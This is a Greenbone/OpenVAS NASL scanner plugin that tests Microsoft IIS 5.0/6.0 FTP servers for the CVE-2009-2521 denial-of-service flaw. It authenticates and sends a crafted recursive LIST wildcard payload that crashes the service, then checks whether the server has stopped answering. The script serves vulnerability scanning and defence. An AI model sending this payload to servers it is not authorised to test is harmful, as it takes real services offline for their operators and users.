# Copyright (C) 2009 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900944");
  script_version("2022-12-05T10:11:03+0000");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2009-09-18 08:01:03 +0200 (Fri, 18 Sep 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-2521");
  script_name("Microsoft IIS FTP Server 'ls' Command DOS Vulnerability");
  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/advisory/975191.mspx");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36273");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html");
  script_xref(name:"URL", value:"http://blogs.technet.com/msrc/archive/2009/09/01/microsoft-security-advisory-975191-released.aspx");
  script_xref(name:"URL", value:"http://blogs.technet.com/msrc/archive/2009/09/03/microsoft-security-advisory-975191-revised.aspx");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote authenticated users to crash the
  application leading to denial of service condition.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 5.0 and 6.0.");

  script_tag(name:"insight", value:"A stack consumption error occurs in the FTP server while processing crafted
  LIST command containing a wildcard that references a subdirectory followed by
  a .. (dot dot).");

  script_tag(name:"solution", value:"Upgrade to IIS version 7.5");

  script_tag(name:"summary", value:"Microsoft IIS with FTP server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

if(ftp_authenticate(socket:soc, user:login, pass:pass)) {

  cmd = 'LIST "-R */../"\r\n'; # The IIS server crashes and restarted.
  send(socket:soc, data:cmd);
  sleep(10);
  buff = recv(socket:soc, length:1024);

  ecmd = 'LIST\r\n';
  send(socket:soc, data:ecmd);
  eresp = recv(socket:soc, length:1024);
  if("Can't open data connection" >< eresp){
    security_message(port:port);
  }
}

close(soc);
